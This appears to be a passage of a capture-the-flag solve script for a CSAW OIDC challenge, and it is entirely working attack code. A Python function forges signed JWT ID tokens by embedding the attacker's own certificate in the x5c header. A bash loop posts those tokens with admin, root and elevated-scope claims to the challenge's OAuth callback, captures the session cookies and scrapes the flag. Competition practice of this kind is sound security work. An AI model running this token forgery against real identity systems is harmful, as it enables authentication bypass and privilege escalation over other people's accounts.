import base64, json, subprocess, sys, time
def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def make(claims, key='mykey.pem', cn='strataid.example.com'):
    der = subprocess.run(['openssl','x509','-in','mycert.pem','-outform','DER'],capture_output=True).stdout
    hdr = {"alg":"RS256","typ":"JWT","x5c":[base64.b64encode(der).decode()]}
    hdr.update(claims.get('_hdr',{}))
    claims = {k:v for k,v in claims.items() if k!='_hdr'}
    claims.setdefault('iss','strataid.example.com')
    claims.setdefault('aud','trustdinoidc-portal')
    claims.setdefault('exp',int(time.time())+3600)
    h = b64u(json.dumps(hdr,separators=(',',':')).encode())
    p = b64u(json.dumps(claims,separators=(',',':')).encode())
    sig = subprocess.run(['openssl','dgst','-sha256','-sign',key],input=(h+'.'+p).encode(),capture_output=True).stdout
    return h+'.'+p+'.'+b64u(sig)
if __name__=='__main__':
    print(make(json.loads(sys.argv[1])))
EOF
for v in '{"sub":"admin","role":"admin"}' '{"sub":"admin","admin":true}' '{"sub":"admin","groups":["admin"]}' '{"sub":"admin","scope":"openid profile freeosaurus:redeem flagosaurus:redeem"}' '{"sub":"admin","scope":"openid profile freeosaurus:redeem admin"}' '{"sub":"admin","scope":"openid profile freeosaurus:redeem role:admin"}' '{"sub":"curator"}' '{"sub":"root"}'; do
  T=$(python3 forge.py "$v")
  R=$(curl -s -X POST "http://trustdinoidc.chal.csaw.io:8990/oauth/callback" --data-urlencode "id_token=$T" -d "state=test" -D- -o /dev/null | grep -i '^set-cookie' | sed 's/.*session=//;s/;.*//')
  RES=$(curl -s -b "session=$R" "http://trustdinoidc.chal.csaw.io:8990/" | grep -A3 'flagosaurus print' | tail -3)
  echo "$v => $(echo $RES | tr -d '\n')"
  echo "$R" > "sess_$(echo $v | md5sum | cut -c1-6).txt"
done
